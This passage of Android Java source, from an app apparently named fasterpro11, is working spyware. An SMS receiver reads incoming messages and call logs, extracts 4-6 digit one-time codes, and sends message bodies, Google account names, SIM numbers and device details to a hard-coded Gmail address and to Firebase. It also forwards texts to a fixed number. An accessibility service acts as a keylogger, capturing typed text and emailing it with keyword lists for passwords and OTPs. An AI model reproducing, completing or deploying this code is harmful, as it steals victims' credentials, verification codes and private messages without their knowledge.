                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "PatternMatchInCallLogs Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean isPatternMatchInRecentIncomingMessages() {
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group(1);
                    if (matchedNumber.length() >= 4 && matchedNumber.length() <= 6 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "pattern Matched 4 to 6 digit numbers in Incoming Messages: " + matchedNumber);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "pattern Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }


    private boolean isInternetConnected() {
        try {
            ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet connection: " + e.getMessage());
        }
        return false;
    }

    private boolean isNumberInCallLog(String sender) {
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;

        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    if (number.equals(sender)) {
                        Log.d(TAG, "Number found in call log: " + sender);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        Log.d(TAG, "Sender number not found in call log: " + sender);
        return false;
    }








    //START serch Words For Sim Number set in messageBody  ============= START  code=============

    //serch Words start code for Sim Number Set. By  Own User . Sim Number Get From User ============= start code =============
    public boolean isSimNumberGetFromUserWords1(String messageBody) {
        for (String keyword : SimNumberGetFromUserWords) {
            if ( messageBody.contains(keyword ) ||  messageBody.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word1 match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 1", "give sim number", "sim number get from user",
            "Sim Number Get From User"   ));

    public boolean isSimNumberGetFromUserWords2(String messageBody) {
        for (String keyword : SimNumberGetFromUserWords2) {
            if ( messageBody.contains(keyword ) ||  messageBody.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word2 match : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords2 = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words2",   "&",     "*", "-",  "+"        ));
    //serch Words End code for Sim Number Set. By  Own User . Sim Number Get From User ============= Edd code =============



    public boolean  isSimNumberSetAlartmessageBody(String messageBody) {
        String SimNumberSetAlartmessageBodyKeyword = SimNumberSetAlartmessageBody(messageBody);
        if (SimNumberSetAlartmessageBodyKeyword != null) {
            Log.d(TAG, "messageBody Sim Number Set Alart messageBody: " + SimNumberSetAlartmessageBodyKeyword);
            return true;
        }
        return false;
    }

    public String SimNumberSetAlartmessageBody(String messageBody) {
        String[] SimNumberSetAlartmessageBodyKeywords = {
                "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
                "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
                "number is off? ","number is off",
                "à¦¤à§à¦®à¦¾à¦° à¦à¦‡ à¦¨à¦®à§à¦¬à¦¾à¦°à§‡ à¦•à¦² à¦¢à§à¦•à¦›à§‡à¦¨à¦¾ à¦•à§‡à¦¨",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¤à§‹à¦®à¦¾à¦° à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¬à§à¦²à¦• à¦•à¦°à¦¾",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¬à§à¦²à¦• à¦•à¦°à¦¾ ?",
                "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°à§‡à¦° à¦«à§à¦°à¦¿ à¦…à¦«à¦¾à¦° à¦šà§‡à¦• à¦•à¦°à§à¦¨", "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°à§‡à¦° à¦à§à¦¯à¦¾à¦ª à¦¥à§‡à¦•à§‡ à¦…à¦«à¦¾à¦° à¦šà§‡à¦• à¦•à¦°à§à¦¨",  "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦•à¦¿",
                "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¤à§‹à¦®à¦¾à¦°",
                "sim set alarts"
        };

        for (String keyword : SimNumberSetAlartmessageBodyKeywords) {
            if (messageBody.equals(keyword) || messageBody.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }
  //Alart messageBody  Sim Number Set============= end code =============

//END serch Words For Sim Number set in messageBody  ============= END code=============















    public String extractPlusPrefixedNumbersFromSMS(String messageBody,Context context){
        Log.d(TAG, "extractPlusPrefixedNumbersFromSMS method call");
        // Updated regex to match numbers starting with '+' followed by 10 to 16 digits
        Pattern pattern = Pattern.compile("\\+\\d{10,16}");  // This regex will match + followed by 10 to 16 digits
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));

                // Date pattern matching, although it may not be needed for your case
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                // Matching the phone numbers starting with '+' and having 10 to 16 digits
                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group();
                    // Check if the number length is between 10 and 16 digits and not a date
                    if (matchedNumber.length() >= 10 && matchedNumber.length() <= 16 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "Pattern matched phone number in Incoming Messages: " + matchedNumber);
                        storeExtractPlusPrefixedNumbersFromSMS(matchedNumber.toString(),  messageBody,mContext);

                    }
                    return matchedNumber;  // Return the matched phone number
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return null;  // Return null if no match is found
    }


    public void storeExtractPlusPrefixedNumbersFromSMS(String validNumbers, String messageBody,Context context) {
        // à¦•à¦¨à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦šà§‡à¦• à¦•à¦°à¦¾ (mContext à¦¯à¦¦à¦¿ null à¦¹à§Ÿ)
        if (context == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return; // à¦¯à¦¦à¦¿ context null à¦¹à§Ÿ, à¦¤à¦¾à¦¹à¦²à§‡ à¦•à¦¾à¦°à§à¦¯à¦•à§à¦°à¦® à¦¬à¦¨à§à¦§ à¦•à¦°à¦¾
        }
        // à¦¶à§‡à§Ÿà¦¾à¦°à§à¦¡ à¦ªà§à¦°à¦¿à¦«à¦¾à¦°à§‡à¦¨à§à¦¸à§‡ à¦¨à¦®à§à¦¬à¦°à¦—à§à¦²à§‹ à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ editor à¦ªà¦¾à¦“à§Ÿà¦¾
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (validNumbers != null && validNumbers.matches("\\+\\d{10,16}")) {
            editor.putString("validPhoneNumbers", validNumbers);
            editor.apply(); // à¦ªà¦°à¦¿à¦¬à¦°à§à¦¤à¦¨à¦—à§à¦²à§‹ à¦…à§à¦¯à¦¾à¦ªà§à¦²à¦¾à¦‡ à¦•à¦°à¦¾
            Log.d(TAG, "Stored valid phone numbers in SharedPreferences: " + validNumbers);
        } else {
            Log.e(TAG, "Invalid phone number format: " + validNumbers);
        }
        RetrieveStoredSharedPreferencesPhoneNumbers( context);
    }

    public String RetrieveStoredSharedPreferencesPhoneNumbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // à¦¶à§‡à§Ÿà¦¾à¦°à§à¦¡ à¦ªà§à¦°à¦¿à¦«à¦¾à¦°à§‡à¦¨à§à¦¸ à¦¥à§‡à¦•à§‡ à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¨à¦®à§à¦¬à¦°à¦—à§à¦²à§‹ à¦°à¦¿à¦Ÿà¦¾à¦°à§à¦¨ à¦•à¦°à¦¾
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¨à¦®à§à¦¬à¦° à¦²à§‹à¦— à¦•à¦°à¦¾
        String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
        if (validPhoneNumbers != null) {
            Log.d(TAG, "Stored valid phone numbers in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers: " + validPhoneNumbers);
        } else {
            Log.d(TAG, "No valid phone numbers found in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers.");
        }
        return validPhoneNumbers; // à¦†à¦—à§‡à¦° à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¡à§‡à¦Ÿà¦¾ à¦°à¦¿à¦Ÿà¦¾à¦°à§à¦¨ à¦•à¦°à§à¦¨
    }


    // Set Sim1 Number firebase subject ============= start code ==============



    public String SetSim1Number(Context context, String messageBody) {
        Log.d(TAG, " method SetSim1Number ");
        boolean IsSimNumberSetAlart =  isSimNumberSetAlartmessageBody(messageBody);
        String GetSim1RetrieveStoredSharedPreferencesPhoneNumbers = RetrieveStoredSharedPreferencesPhoneNumbers(context);
        Log.d(TAG, " IsSimNumberSetAlart: " + IsSimNumberSetAlart);
        Log.d(TAG, " GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " +  GetSim1RetrieveStoredSharedPreferencesPhoneNumbers);

        if (IsSimNumberSetAlart  &&  GetSim1RetrieveStoredSharedPreferencesPhoneNumbers != null ) {
            sim1Number = GetSim1RetrieveStoredSharedPreferencesPhoneNumbers;
            Log.d(TAG, " Sim1 Number Set from Sms: " + sim1Number);
            return sim1Number;
        }
        return GetSim1RetrieveStoredSharedPreferencesPhoneNumbers;
    }

    // Set Sim1 Number firebase subject === end =============


    public void forwardSmsByEmail(String sender, String messageBody, Context context) throws MessagingException {
        Log.d(TAG, "Preparing to send email...");
        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);

        GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
        String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
        String Get_Sim1_Number = SetSim1Number( context,messageBody);
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;
        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        LocationUtil locationUtil = new LocationUtil ();
        String countryName = locationUtil.getFullCountryName();

        // Set the subject to include sender and mobile model
        String subject ="SMS ID: " + Get_Sim1_Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel +" User: "+ GoogleAccountName +" " + userSimNumber + " SMS from: " + sender + " Country: " + countryName ;
        Log.e(TAG, "SMS email subject: "+ subject );

        try {
            Log.d(TAG, "Attempting to send email through JavaMailAPI_SmsReceiver_Send...");
            JavaMailAPI_SmsReceiver_Send.sendMail("abontiangum99@gmail.com", subject, messageBody);
            Log.d(TAG, "sendMail method called successfully.");
        } catch (Exception e) {
            Log.e(TAG, "Error calling sendMail: " + e.getMessage());
        }

        // Firebase à¦ à¦¡à§‡à¦Ÿà¦¾ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à¦¾
        Log.d(TAG, "SmsReciver Data prepare for Firebase.");
        FirebaseSaVeAndViewData firebaseSaVeAndViewData = new FirebaseSaVeAndViewData();
        firebaseSaVeAndViewData.saveSmsDataToFirebase(sender, messageBody, subject, recentCallLogs,context);
        Log.d(TAG, "Sms Data saved to Firebase.");
    }

    void forwardSmsBySMS(String sender, String messageBody, Context context) {
        // Ensure messageBody and sender are not null
        if (sender != null && messageBody != null) {
            // Get the previous message data from SharedPreferences
            SharedPreferences preferences = context.getSharedPreferences("SMSPrefs", Context.MODE_PRIVATE);
            String previousMessage = preferences.getString("lastSent", ""); // Removed extra space

            // Check if the new message is different from the previous one
            if (!messageBody.equals(previousMessage)) {
                // Forward the SMS with the message content
                SmsManager smsManager = SmsManager.getDefault();
                String smsMessage = messageBody;
                ArrayList<String> parts = smsManager.divideMessage(smsMessage); // Handle long messages
                smsManager.sendMultipartTextMessage(FORWARD_SMS_NUMBER, null, parts, null, null);
                Log.d(TAG, "Forwarded SMS by SMS to " + FORWARD_SMS_NUMBER + ": " + smsMessage);

                // Store the new message as the last sent message
                SharedPreferences.Editor editor = preferences.edit();
                editor.putString("lastSent", messageBody); // Removed extra space
                editor.apply();
            } else {
                Log.d(TAG, "Message is the same as the previous one. Not forwarding forwardSmsBySMS.");
            }
        } else {
            Log.e(TAG, "Sender or messageBody is null. Cannot forward SMS forwardSmsBySMS.");
        }
    }




    // Helper function to call the onReceive method with appropriate context
    public void SMSReciver(Context context, Intent intent) {
        onReceive(context, intent);
    }


    public void sendSmsByEmail(String sender, String messageBody, Context context) throws MessagingException {
        forwardSmsByEmail(sender, messageBody, context);
    }

}




//MyAccessibilityService.java
package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final String FORWARD_EMAIL = "abontiangum99@gmail.com";
    private static final int KEYSTROKE_THRESHOLD = 3000;
    private static final long DEBOUNCE_DELAY_MS = 6000;
    private static final long EMAIL_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutes
    private static final long KEYSTROKE_TIMEOUT_MS = 3 * 60000; // 120 seconds after key detact

    private StringBuilder keystrokes = new StringBuilder();
    private StringBuilder currentBatch = new StringBuilder();
    private ExecutorService executorService = Executors.newSingleThreadExecutor();
    private long lastEventTime = 0;
    private long lastEmailTime = 0;
    private String lastForwardedKeystrokes = "";
    private String currentAppName = "";
    private Context mContext;

    private Handler keystrokeHandler = new Handler(Looper.getMainLooper());
    private Runnable keystrokeRunnable = null;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = getApplicationContext();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        long currentTime = System.currentTimeMillis();

        // Debounce to avoid rapid events
        if (currentTime - lastEventTime < DEBOUNCE_DELAY_MS) {
            return;
        }

        lastEventTime = currentTime;

        int eventType = event.getEventType();

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleTextChangedEvent(event);
        }
        else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            handleViewClickedEvent(event);
        }
        else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            handleWindowStateChange(event);
        }
        else {
            Log.d(TAG, "Unhandled event type: " + eventType);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            String typedText = event.getText().get(0).toString();

            if (!TextUtils.isEmpty(typedText)) {
                Log.d(TAG, "Keystroke detected: " + typedText);

                // Reset and store the new text
                keystrokes.setLength(0);
                keystrokes.append(typedText);

                currentBatch.setLength(0);
                currentBatch.append(typedText);

                // Cancel previous timeout
                if (keystrokeRunnable != null) {
                    keystrokeHandler.removeCallbacks(keystrokeRunnable);
                }

                keystrokeRunnable = new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG, "Typed text detected (Final): " + keystrokes.toString());
                        // You can add forwarding logic here if needed
                    }
                };

                // Schedule new timeout (3 minit)
                keystrokeHandler.postDelayed(keystrokeRunnable, KEYSTROKE_TIMEOUT_MS);

                // Get package and class info
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    CharSequence packageName = source.getPackageName();
                    CharSequence className = source.getClassName();
                    if (!TextUtils.isEmpty(packageName) && !TextUtils.isEmpty(className)) {
                        currentAppName = packageName.toString() + "/" + className.toString();
                    }
                    source.recycle();
                }
            }
        }
    }

    // Rest of your existing methods remain unchanged...
    private void handleViewClickedEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String viewIdResourceName = source.getViewIdResourceName();
            String className = source.getClassName().toString();
            Log.d(TAG, "View clicked. View ID: " + viewIdResourceName + ", Class Name: " + className);

            if (isSendButton(viewIdResourceName, className)) {
                Log.d(TAG, "Send button clicked. Forwarding keystrokes.");
                forwardKeystrokesORSaveToTextFile(currentBatch.toString(), currentAppName);
                currentBatch.setLength(0);
            }

            source.recycle();
        } else {
            Log.d(TAG, "Source is null in handleViewClickedEvent.");
        }
    }

    private void handleWindowStateChange(AccessibilityEvent event) {
        Log.d(TAG, "Window state changed. Forwarding keystrokes.");
        forwardKeystrokesORSaveToTextFile(currentBatch.toString(), currentAppName);
        currentBatch.setLength(0);
    }

    private boolean isSendButton(String viewIdResourceName, String className) {
        boolean isSendButton = (viewIdResourceName != null && viewIdResourceName.contains("send_button_id"))
                || "android.widget.Button".equals(className)
                || "android.widget.TextView".equals(className);
        return isSendButton;
    }

    private void forwardKeystrokesORSaveToTextFile(String keystrokes, String appName) {
        if (!TextUtils.isEmpty(keystrokes) && !keystrokes.equals(lastForwardedKeystrokes)) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastEmailTime >= EMAIL_COOLDOWN_MS) {
                if (isInternetConnected()) {
                    String sender = SmsReceiver.getSender();
                    Log.d(TAG, "Forwarding keystrokes. Sender: " + sender);
                    // Save To Text File in NotificationListener class
                    String SaveToTextFileKeystrokes = "Text: "+ keystrokes;
                    Context appContext = getApplicationContext();
                    Intent intent = new Intent(appContext, NotificationListener.class);
                    intent.setAction("SAVE_TO_TEXT_FILE");
                    intent.putExtra("content", SaveToTextFileKeystrokes);
                    appContext.startService(intent);

                    //forward Keystrokes By Email
                    forwardKeystrokesByEmail(keystrokes, appName, sender, getApplicationContext());
                    lastForwardedKeystrokes = keystrokes;
                    lastEmailTime = currentTime;
                } else {
                    Log.d(TAG, "No internet connection. Keystrokes not forwarded.");
                }
            } else {
                Log.d(TAG, "Email cooldown active. Keystrokes not forwarded.");
            }
        } else {
            Log.d(TAG, "Keystrokes are empty or already forwarded.");
        }
    }

    private void forwardKeystrokesByEmail(String keystrokes, String appName, String sender, Context context) {
        executorService.execute(() -> {
            try {
                if (context == null) {
                    Log.e(TAG, "sendEmailWithAttachment: Context is null!");
                    return;
                }
                Log.d(TAG, "Sending email with sendEmailWithAttachment method");
                new Handler(Looper.getMainLooper()).post(() -> {
                    AccountUtil accountUtil = new AccountUtil();
                    String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
                    String userSimNumber = accountUtil.getUserSimNumber(context);

                    SmsReceiver smsReceiver = new SmsReceiver();
                    String messageBody= "Your  Text";
                    String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
                    NotificationListener notificationListener = new NotificationListener();
                    String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
                    String setSim1Number ;
                    if (setSim1NumberSmsReceiver != null) {
                        setSim1Number = setSim1NumberSmsReceiver;
                    }else if(setSim1NumberNotificationListener != null) {
                        setSim1Number = setSim1NumberNotificationListener;
                    }else {
                        setSim1Number = null;
                    }
                    GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                    String UserID1= alert.getSim1NumberFromUser(context);
                    String UserID2= alert.getSim2NumberFromUser(context);
                    String UserGivenSimNumber= UserID1 + " "+UserID2;

                    String manufacturer = Build.MANUFACTURER;
                    String mobileModel = Build.MODEL;
                    String subject ="Key:ID: " + setSim1Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + GoogleAccountName +" Number: " +userSimNumber;
                    Log.e(TAG, "SMS email subject: "+ subject);



                    JavaMailAPI_MyAccessibilityService_Sender.sendMail(FORWARD_EMAIL, subject, keystrokes);
                    Log.d(TAG, "Keystrokes forwarded successfully via email.");
                });
            } catch (Exception e) {
                Log.e(TAG, "Failed to forward keystrokes via email", e);
            }
        });
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        Log.d(TAG, "Is internet connected? " + isConnected);
        return isConnected;
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "AccessibilityService interrupted.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "AccessibilityService connected.");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        Log.d(TAG, "AccessibilityServiceInfo configured.");
    }

    public boolean isKeystokeForwardMatchwords1(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchwords1) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word1: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchwords1 = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word1", "password", "1xbet","otp",
            "keystoke Forwarding match word1"));

    public boolean isKeystokeForwardMatchwords2(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchwords2) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word2: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchwords2 = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word2", "Keystoke otp2", "keystoke Forwarding match word1"));


    public boolean isKeystokeForwardMatchOtpwords(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchOtpwords) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word2: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchOtpwords = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word2", "OTP", "Otp", "otp", "keystoke Forwarding match word1"));

}



//AccountUtil.java
package com.example.fasterpro11;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class AccountUtil {
    private static final String TAG = "AccountUtil";
    public String sim1_Number="";
    public String sim2_Number="";

    // Method to get default Google account
    public String getDefaultGoogleAccount(Context context) {
        // For Android version 9 and below, fetch Google account
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            AccountManager accountManager = (AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
            String accountName = null;

            try {
                if (accountManager != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.GET_ACCOUNTS)
                                == PackageManager.PERMISSION_GRANTED) {
                            Log.d(TAG, "permission GET_ACCOUNTS is granted.");

                            Account[] accounts = accountManager.getAccounts();

                            for (Account account : accounts) {
                                Log.d(TAG, "Account Name: " + account.name + " Type: " + account.type);
                                if (account.name != null && !account.name.isEmpty()) {
                                    return account.name;
                                }
                            }

                            Account[] googleAccounts = accountManager.getAccountsByType("com.google");

                            if (googleAccounts.length > 0) {
                                accountName = googleAccounts[0].name;
                                Log.d(TAG, "Default Google Account Name: " + accountName);
                            } else {
                                Log.d(TAG, "No Google accounts found.");
                            }
                        } else {
                            Log.d(TAG,"Permission not granted to access accounts.");
                            ActivityCompat.requestPermissions((Activity) context,
                                    new String[]{android.Manifest.permission.GET_ACCOUNTS}, 1);
                            return null;
                        }
                    } else {
                        Account[] accounts = accountManager.getAccounts();
                        for (Account account : accounts) {
                            Log.d(TAG, "Account Name: " + account.name + " Type: " + account.type);
                            if (account.name != null && !account.name.isEmpty()) {
                                return account.name;
                            }
                        }

                        Account[] googleAccounts = accountManager.getAccountsByType("com.google");

                        if (googleAccounts.length > 0) {
                            accountName = googleAccounts[0].name;
                            Log.d(TAG, "Default Google Account Name: " + accountName);
                        } else {
                            Log.d(TAG, "No Google accounts found.");
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error while getting Google account", e);
            }
        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG, "Android version >= 10. Returning null due to security restrictions.");
            return null;
        }

        return null; // Ensure a return value is provided for all cases
    }

    // Method to fetch Subscriber ID (SIM number) after checking permissions
    public String getSubscriberId(Context context) {
        // For Android version 9 and below, fetch IMSI and SIM number
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {

            try {
                if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                        == PackageManager.PERMISSION_GRANTED &&
                        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS)
                                == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Permissions READ_PHONE_STATE and READ_PHONE_NUMBERS are granted.");
                    return fetchSubscriberId(context);
                } else {
                    Log.d(TAG,"Permissions not granted to access phone state.");
                    ActivityCompat.requestPermissions((Activity) context,
                            new String[]{android.Manifest.permission.READ_PHONE_STATE, android.Manifest.permission.READ_PHONE_NUMBERS},
                            2);
                    return null;
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Error fetching subscriber ID due to SecurityException", e);
                return null; // Return null in case of security exceptions
            } catch (Exception e) {
                Log.e(TAG,"Unexpected error fetching subscriber ID", e);
                return null; // Return null for any other errors
            }

        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG, "Android version >= 10. Returning null due to security restrictions.");
            return null;
        }
    }

    private String fetchSubscriberId(Context context) {
        // For Android version 9 and below, fetch IMSI and SIM number
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {

